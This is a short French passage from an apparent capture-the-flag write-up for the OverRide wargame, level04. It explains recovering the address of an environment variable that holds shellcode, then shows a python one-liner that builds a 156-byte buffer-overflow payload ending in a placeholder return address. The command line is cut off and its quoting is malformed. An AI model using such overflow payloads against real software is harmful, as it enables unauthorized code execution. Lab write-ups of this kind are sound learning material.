...
Il faut ensuite récupérer l'adresse de la variable d'environnement qui change selon le répertoire ou l'on se trouve.

```
level04@OverRide:~$ python -c 'print "a" * 156 + "ENVIRONEMENT_SHELLCODE_ADDRESS'[::-1] > /tmp/level04
